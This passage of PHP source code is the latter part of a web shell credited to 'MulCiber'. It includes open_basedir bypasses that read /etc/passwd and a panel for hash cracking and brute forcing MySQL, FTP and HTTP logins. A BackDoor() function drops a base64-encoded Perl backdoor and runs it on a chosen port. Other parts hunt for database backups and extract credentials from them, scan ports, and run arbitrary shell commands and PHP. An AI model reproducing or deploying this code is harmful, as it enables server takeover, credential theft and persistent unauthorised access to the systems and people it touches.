1242.
                  @include($_POST['file_bypass']);
1243.
                  echo "</textarea>";
1244.
              }
1245.
          }
1246.
          elseif(isset($_POST['sql_bypass']))
1247.
          {
1248.
              extract($_SESSION);
1249.
              $conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
1250.
              if($conn)
1251.
              {
1252.
                  mysql_select_db($_POST['sql_db']);
1253.
                  mysql_query("CREATE TABLE `$_POST[tmp_table]` (`File` TEXT NOT NULL);");
1254.
                  mysql_query("LOAD DATA INFILE \"$_POST[sql_file]\" INTO TABLE $_POST[tmp_table]") or die(mysql_error());
1255.
                  $res=mysql_query("SELECT * FROM $_POST[tmp_table]");
1256.
                  if(mysql_num_rows($res)<1) die("Failed to retrieve file contents!");
1257.
                  if($res)
1258.
                  {
1259.
                      while($row=mysql_fetch_array($res)) $f.="$row[0]</br>";
1260.
                      echo $f;
1261.
                  }
1262.
              mysql_query("DROP TABLE $_POST[tmp_table]");
1263.
              }
1264.
          }
1265.
          echo "<table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Security (open_basedir) bypassers</td></tr>
1266.
          <tr><td>Bypass using cURL</td><td>Bypass using tempnam()</td></tr>
1267.
          <tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='curl_bypass' value='Bypass'></form></td><td><form action='$self?act=bypass' method='post' name='bypasser'>Write file: <input type='text' value='../../../etc/passwd' name='file_bypass'><input type='submit' name='tmp_bypass' value='Bypass'></form></td></tr>
1268.
          <tr><td>Bypass using copy()</td><td>Bypass using include()</td></tr>
1269.
          <tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name='dest' value='".CleanDir(getcwd())."/copy.php'></br> File to copy: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='copy_bypass' value='Bypass'></form></td><td><form action='$self?act=bypass' method='post' name='bypasser'>Path to file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='include_bypass' value='Bypass'></form></td></tr>
1270.
          <tr><td colspan='2'>Bypass using SQL LOAD INFILE [Login to SQL server first]</td></tr>
1271.
          <tr><td colspan='2'><form action='$self?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary table: <input type='text' value='tmp_database' name='sql_db'></br>Temporary table: <input type='text' value='tmp_file' name='tmp_table'></br><input type='text' value='/etc/passwd' name='sql_file'><input type='submit' name='sql_bypass' value='Bypass'></form></td></tr>
1272.
          </table>";
1273.
      }
1274.
      function brute_force()
1275.
      {
1276.
          echo "<form action='$self' method='post' enctype='multipart/form-data'><input type='hidden' name='docrack'><table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Password crackers</td></tr>
1277.
          <tr><td>MD5 Cracker</td><td>SHA1 Cracker</td></tr>
1278.
          <tr><td>Hash: <input type='text' name='md5hash'><input type='submit' value='Crack' name='md5crack'></td><td>Hash: <input type='text' name='sha1hash'><input type='submit' value='Crack' name='sha1crack'></td></tr>
1279.
          <tr><td>VBulletin Salt Cracker</td><td>SMF Salt cracker</td></tr>
1280.
          <tr><td>Hash: <input type='text' name='vbhash'></br>Salt: <input type='text' name='vbsalt' salt='#7A'></br><input type='submit' value='Crack' name='vbcrack'></td><td>Hash: <input type='text' name='smfhash'></br>Salt: <input type='text' name='smfsalt'></br><input type='submit' value='Crack' name='smfcrack'></td></tr>
1281.
          <tr><td>MySQL Brute Force</td><td>FTP Brute Force</td></tr>
1282.
          <tr><td>User: <input type='text' value='root' name='mysql_user'></br>Host: <input type='text' value='localhost' name='mysql_host'></br>Port: <input type='text' value='3306' name='mysql_port'></br><input type='submit' value='Brute' name='mysqlcrack'></td><td>User: <input type='text' value='root' name='ftp_user'></br>Host: <input type='text' value='localhost' name='ftp_host'></br>Port: <input type='text' value='21' name='ftp_port'></br>Timeout: <input type='text' value='5' name='ftp_timeout'></br><input type='submit' value='Brute' name='ftpcrack'></td></tr>
1283.
          <tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>
1284.
          <tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' name='remote_login_user'><input type='submit' value='Brute' name='remote_login'></td><td>Username: <input type='text' name='auth_user' value='porn_user101'></br>Auth URL: <input type='text' name='auth_url'><input type='submit' value='Brute' name='authcrack'></td></tr>
1285.
          <tr><td colspan='2'>Wordlist</td></tr>
1286.
          <tr><td colspan='2'><input type='file' name='wordlist'></br></br><b>Notice: Be sure to check the max POST length allowed</b></td></tr>
1287.
          </br></table></form>";
1288.
      }
1289.
      function BackDoor()
1290.
      {
1291.
          global $backdoor_perl;
1292.
          global $disable;
1293.
          if(!isset($_POST['backdoor_host']))
1294.
          {
1295.
              echo "<center><form action='$self?act=bh' method='post'>
1296.
              Port: <input type='text' name='port'>
1297.
              <input type='submit' name='backdoor_host' value='Backdoor'></center>";
1298.
          } else {
1299.
              @$fh=fopen("shbd.pl","w");
1300.
              @fwrite($fh,base64_decode($backdoor_perl));
1301.
              @fclose($fh);
1302.
              execmd("perl shbd.pl $_POST[port]",$disable);
1303.
              echo "Server backdoor'd</br>";
1304.
          }
1305.
      }
1306.
      function sql_rep_search($dir)
1307.
      {
1308.
          global $self;
1309.
          $ext=array(".db",".sql");
1310.
          @$dh=opendir($dir);
1311.
          while((@$file=readdir($dh)))
1312.
          {
1313.
              $ex=strrchr($file,'.');
1314.
              if(in_array($ex,$ext)&&$file!="Thumbs.db"&&$file!="thumbs.db")
1315.
              echo "<tr><td><center><a href='$self?act=f&file=$dir"."$file'>$dir"."$file</center></td></tr>";
1316.
              if(is_dir($dir.$file)&&$file!='..'&&$file!='.')
1317.
              {
1318.
                  if(!preg_match("/\/public_html\//",$dir))
1319.
                  sql_rep_search($dir.$file.'/public_html/');
1320.
                  else
1321.
                  sql_rep_search($dir.$file);
1322.
              }
1323.
          }
1324.
          @closedir($dh);
1325.
      }
1326.
      function database_tools()
1327.
      {
1328.
          if(isset($_POST['sql_start_search']))
1329.
          {
1330.
              echo "<center><table style='width: auto;'><tr><td><center><font color='#FF0000'>Databases</font></center></td></tr>";
1331.
              sql_rep_search("/home/");
1332.
              echo "</table></center>";
1333.
          }
1334.
          $colarr=array();
1335.
          if(isset($_POST['db_parse']))
1336.
          {
1337.
              if(!is_file($_FILES['db_upath']['tmp_name'])&&empty($_POST['db_dpath'])) die("Please specify a DB to parse...");
1338.
              $db_meth=empty($_POST['db_dpath'])?'uploaded':'path';
1339.
              $q_delimit=$_POST['q_delimit'];
1340.
              if(isset($_POST['column_defined']))
1341.
              {
1342.
                  switch($_POST['column_type'])
1343.
                  {
1344.
                      case 'SMF':
1345.
                      break;
1346.
                      case 'phpbb':
1347.
                      break;
1348.
                      case 'vbulletin':
1349.
                      $colarr=array(4,5,7,48);
1350.
                      break;
1351.
                  }
1352.
              } else {
1353.
                  $strr=str_replace(", ",",",trim($_POST['db_columns']));
1354.
                  $colarr=explode(",",$strr);
1355.
              }
1356.
              switch($db_meth)
1357.
              {
1358.
                  case 'uploaded':
1359.
                  @$fh=fopen($_FILES['db_upath']['tmp_name'],'r') or die("Failed to open file for reading");
1360.
                  break;
1361.
                  case 'path':
1362.
                  @$fh=fopen($_POST['db_dpath'],'r') or die("Failed to open file for reading");
1363.
                  break;
1364.
              }
1365.
                  echo "Parsing database contents...</br>";
1366.
                  while(!feof($fh))
1367.
                  {
1368.
                      $c_line=fgets($fh);
1369.
                      $strr=str_replace(", ",",",$c_line);
1370.
                      $arr=explode(',',$strr);
1371.
                      for($i=0;$i<count($colarr);$i++)
1372.
                      {
1373.
                          $index=$colarr[$i];
1374.
                          if(empty($arr[$index])) continue;
1375.
                          $spos=strpos("$_POST[q_delimit]",$arr[$index]);
1376.
                          $spos=strpos("$_POST[q_delimit]",$arr[$index],$spos);
1377.
                          if($i!==count($colarr)-1)
1378.
                          echo "$arr[$index] : ";
1379.
                          else echo "$arr[$index]</br>";
1380.
                      }
1381.
                      continue;
1382.
                   }
1383.
                   @fclose($fh);
1384.
          }
1385.
          echo "<table style='width: 100%; margin: auto; text-align: center'>
1386.
          <tr><td colspan='2'>Database parser</td></tr>
1387.
          <tr><td>
1388.
          <form action='$self?act=dbs' method='post' enctype='multipart/form-data'>
1389.
          Quote delimiter (usually ` or '): <input type='text' style='width: 20px' name='q_delimit' value='`'> Columns to retrieve (separate by commas): <input type='text' style='width: 200px' name='db_columns' value='3,5,10'></br>
1390.
          Use predefined column match (user+pass+salt): <input type='checkbox' name='column_defined'> <select name='column_type'>
1391.
          <option value='vbulletin'>VBulletin</option><option value='SMF'>SMF</option><option value='phpbb'>PHPBB</option>
1392.
          </select></br>
1393.
          Path to DB dump: <input type='text' style='width: 300px' value='/home/someuser/public_html/backup.db' name='db_dpath'>
1394.
          </br>Upload DB dump: <input type='file' style='width: 300px' value='' name='db_upath'>
1395.
          </br></br><input type='submit' style='width: 300px' value='Parse Database' name='db_parse'></td></tr>
1396.
          <tr><td colspan='2'>Find database Backups</td></tr>
1397.
          <tr><td>Only search within local path: <input type='checkbox' name='sql_search_local'> <input type='submit' value='Go' name='sql_start_search'></br></td></tr>
1398.
          </table>";
1399.
      }
1400.
      function show_tools()
1401.
      {
1402.
          echo "<form action='$self' method='post'>
1403.
          <table style='width: 100%; margin: auto; text-align: center'>
1404.
          <tr><td colspan='2'>Tools</td></tr>
1405.
          <tr><td>Forum locator</td><td>Config locator</td></tr>
1406.
          <tr><td><form action='$self' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_forums'></form></td><td><form action='$self' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_configs'></form></td></tr>
1407.
          <tr><td>Port scanner</td><td>Search</td></tr>
1408.
          <tr><td><form action='$self' method='post'>Host: Start port: <input type='text' value='localhost' name='host'></br>Start port: <input type='text' value='80' style='width: 50px' name='sport'> End Port: <input type'text' style='width: 50px' value='1000' name='eport'></br><input type='submit' value='Scan' name='port_scan'>Using: <select name='type'><option value='php'>PHP</option><option value='perl'>Perl</option></select></form></td><td>Finish this next</td></tr>
1409.
          </table>";
1410.
      }
1411.
      function TrueSize($s)
1412.
      {
1413.
          if(!$s) return 0;
1414.
          if($s>=1073741824) return(round($s/1073741824)." GB");
1415.
          elseif($s>=1048576) return(round($s/1048576)." MB");
1416.
          elseif($s>=1024) return(round($s/1024)." KB");
1417.
          else return($s." B");
1418.
      }
1419.
      function CleanDir($d)
1420.
      {
1421.
          $d=str_replace("\\","/",$d);
1422.
          $d=str_replace("//","/",$d);
1423.
          return $d;
1424.
      }
1425.
      function Trail($d)
1426.
      {
1427.
          $d=explode('/',$d);
1428.
          array_pop($d);
1429.
          array_pop($d);
1430.
          $str=implode($d,'/');
1431.
          return $str;
1432.
      }
1433.
      function Encoder()
1434.
      {
1435.
          echo "<form action='$self?' method='post'>
1436.
          <center>
1437.
          Input: <input type='text' style='width: 300px' name='encrypt'>
1438.
          <br><input type='submit' value='Encrypt' name='encryption'>
1439.
          </center>
1440.
          </form>";
1441.
      }
1442.
      $relpath=(isset($_GET['d']))?CleanDir($_GET['d']):CleanDir(realpath(getcwd()));
1443.
      if(isset($_GET['d'])) $self.="?d=$_GET[d]";
1444.
      echo "<table style='text-align: center; width: 100%'>
1445.
      <tr><td colspan='2'>Execute command</td></tr>
1446.
      <tr><td colspan='2'><form action='$self?' method='post'><input type='text' style='width: 600px' value='whoami' name='cmd'><input type='submit' name='execmd' value='Execute'></form></td></tr>
1447.
      <tr><td colspan='2'>Execute PHP</td></tr>
1448.
      <tr><td colspan='2'><form action='$self' method='post'><textarea rows='2' cols='80' name='phpcode' style='background-color: black;'>//Don't include PHP tags</textarea><input type='submit' name='execphp' value='Execute'></form></td></tr>
1449.
      <tr><td>Create directory</td><td>Create file</td></tr>
1450.
      <tr><td><form action='$self' method='post'><input type='text' style='width: 250px' value='$relpath/sikreet/' name='newdir'><input type='submit' value='Create' name='cnewdir'></form></td><td><form action='$self' method='post'><input type='text' style='width: 250px' value='$relpath/index2.php' name='newfile'><input type='submit' value='Create' name='cnewfile'></form></td></tr>
1451.
      <tr><td>Enter directory</td><td>Edit file</td></tr>
1452.
      <tr><td><form action='$self' method='post'><input type='text' style='width: 225px' name='godir'><input type='submit' value='Go' name='enterdir'></form></td><td><form action='$self' method='post'><input type='text' style='width: 255px' value='/etc/passwd' name='editfile'><input type='submit' name='doeditfile' value='Go'></form></td></tr>
1453.
      <tr><td>Upload file</td><td>Wget file</td></tr>
1454.
      <tr><td><form action='$self' method='post' enctype='multipart/form-data'>Save location: <input type='text' style='width: 300px' value='$relpath' name='u_location'></br><input type='file' name='u_file'><input type='submit' value='Upload' name='doUpload'></form></td><td><form action='$self' method='post'><input type='text' style='width: 255px' value='http://www.site.com/image1.jpg' name='wgetfile'><input type='submit' name='dogetfile' value='Go'></form</td></tr>
1455.
      <tr><td colspan='2'>Switch theme: <a href='$self?theme=green'>Matrix Green</a>, <a href='$self?theme=uplink'>Uplink Blue</a>, <a href='$self?theme=dark'>Dark</a></td></tr>
1456.
      </table>
1457.
      </br></br><div id='bar'><center>Shell [version 2.0] created by <font color='red'><b>[MulCiber]</font> | Page generated in : <font color='red'>".round(microtime()-$start,2)." seconds</font></center></div></body></html>";
1458.
      ob_end_flush();
1459.
      ?>
